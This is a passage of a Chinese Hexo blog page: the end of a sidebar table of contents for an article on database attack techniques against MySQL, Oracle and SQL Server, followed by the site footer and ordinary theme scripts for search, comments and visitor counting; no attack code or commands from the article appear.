class="nav-text">生成一个侦听器来传递反向shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#执行下面的任何一个MySQL查询来调用监听器"><span class="nav-text">执行下面的任何一个MySQL查询来调用监听器</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle-4"><span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-Server-4"><span class="nav-text">SQL Server</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#TSQL"><span class="nav-text">TSQL</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件读写"><span class="nav-text">文件读写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MySQL-4"><span class="nav-text">MySQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle-5"><span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-Server-5"><span class="nav-text">SQL Server</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#横向移动"><span class="nav-text">横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MySQL-5"><span class="nav-text">MySQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle-6"><span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-Server-6"><span class="nav-text">SQL Server</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#数据泄露"><span class="nav-text">数据泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MySQL-6"><span class="nav-text">MySQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle-7"><span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-Server-7"><span class="nav-text">SQL Server</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#持久化"><span class="nav-text">持久化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MySQL-7"><span class="nav-text">MySQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle-8"><span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-Server-8"><span class="nav-text">SQL Server</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-其他"><span class="nav-text">6.其他</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#贡献者"><span class="nav-text">贡献者</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考"><span class="nav-text">参考</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MySQL-8"><span class="nav-text">MySQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle-9"><span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-Server-9"><span class="nav-text">SQL Server</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#沙箱"><span class="nav-text">沙箱</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MySQL-9"><span class="nav-text">MySQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle-10"><span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-Server-10"><span class="nav-text">SQL Server</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#工具"><span class="nav-text">工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MySQL-10"><span class="nav-text">MySQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle-11"><span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-Server-11"><span class="nav-text">SQL Server</span></a></li></ol></li></ol></li></ol></div></div></section></div></aside></div></main><footer id="footer" class="footer"><div class="footer-inner"><div class="copyright">&copy; <span itemprop="copyrightYear">2018</span><span class="with-love" id="animate"><i class="fa fa-user"></i></span> <span class="author" itemprop="copyrightHolder">doubiduo</span></div><div class="powered-by">由 <a rel="external nofollow" class="theme-link" target="_blank" rel="external nofollow" href="https://hexo.io">Hexo</a> 强力驱动</div><div class="theme-info"><div class="powered-by"></div> <span class="post-count">全站共115.2k字</span></div></div></footer><div class="back-to-top"><i class="fa fa-arrow-up"></i></div></div><script type="text/javascript">"[object Function]"!==Object.prototype.toString.call(window.Promise)&&(window.Promise=null)</script><script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script><script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script><script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script><script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script><script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script><script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script><script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script><script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script><script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script><script type="text/javascript">!function(e,t){var n,c=e.getElementsByTagName(t)[0];"function"!=typeof LivereTower&&((n=e.createElement(t)).src="https://cdn-city.livere.com/js/embed.dist.js",n.async=!0,c.parentNode.insertBefore(n,c))}(document,"script")</script><script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script><script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script><script>AV.initialize("auf5TIy4OQOv6c52DIqTOgHd-gzGzoHsz","tBf3kX7KmYaId0Nh4PlLx3XQ")</script><script>function showTime(e){var t=new AV.Query(e),c=[],u=$(".leancloud_visitors");u.each(function(){c.push($(this).attr("id").trim())}),t.containedIn("url",c),t.find().done(function(e){var t=".leancloud-visitors-count";if(0!==e.length){for(var n=0;n<e.length;n++){var o=e[n],i=o.get("url"),s=o.get("time"),r=document.getElementById(i);$(r).find(t).text(s)}for(n=0;n<c.length;n++){i=c[n],r=document.getElementById(i);var l=$(r).find(t);""==l.text()&&l.text(0)}}else u.find(t).text(0)}).fail(function(e,t){console.log("Error: "+t.code+" "+t.message)})}function addCount(i){var e=$(".leancloud_visitors"),s=e.attr("id").trim(),r=e.attr("data-flag-title").trim(),t=new AV.Query(i);t.equalTo("url",s),t.find({success:function(e){if(0<e.length){var t=e[0];t.fetchWhenSave(!0),t.increment("time"),t.save(null,{success:function(e){$(document.getElementById(s)).find(".leancloud-visitors-count").text(e.get("time"))},error:function(e,t){console.log("Failed to save Visitor num, with error message: "+t.message)}})}else{var n=new i,o=new AV.ACL;o.setPublicReadAccess(!0),o.setPublicWriteAccess(!0),n.setACL(o),n.set("title",r),n.set("url",s),n.set("time",1),n.save(null,{success:function(e){$(document.getElementById(s)).find(".leancloud-visitors-count").text(e.get("time"))},error:function(e,t){console.log("Failed to create")}})}},error:function(e){console.log("Error:"+e.code+" "+e.message)}})}$(function(){var e=AV.Object.extend("Counter");1==$(".leancloud_visitors").length?addCount(e):1<$(".post-title-link").length&&showTime(e)})</script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script></body></html>